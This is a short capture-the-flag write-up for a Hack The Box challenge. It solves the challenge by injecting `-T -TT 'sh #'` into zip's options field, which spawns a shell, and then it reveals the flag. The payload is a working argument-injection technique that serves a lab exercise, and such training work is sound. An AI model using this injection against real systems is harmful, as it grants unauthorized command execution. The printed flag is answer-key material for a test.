> Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions.
> For this reason, she decided to hack a tiny robot under Golden Fang's ownership called "Compressor",
> which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission.
> With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast.
> Can you help her take it and hack it?

> Author: **[w3th4nds][author-profile]**

## Zip it down

```
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Compress artifact (zip <name>.zip <name> <options>)
4. Change directory  (cd <dirname>)
5. Clean directory   (rm -rf ./*)
6. Exit
```

According to [GTFOBins][gtfobins], zip has a test option where a custom command can be provided:

```shell
Insert <name>.zip: 1
Insert <name>: 1
Insert <options>: -T -TT 'sh #'
  # adding: 1 (stored 0%)
id
# uid=1000(ctf) gid=1000(ctf)
```

Then, the flad is located 2 directories up:

> `HTB{z1pp1ti_z0pp1t1_GTFO_0f_my_pr0p3rty}`

[author-profile]: https://app.hackthebox.com/users/70668
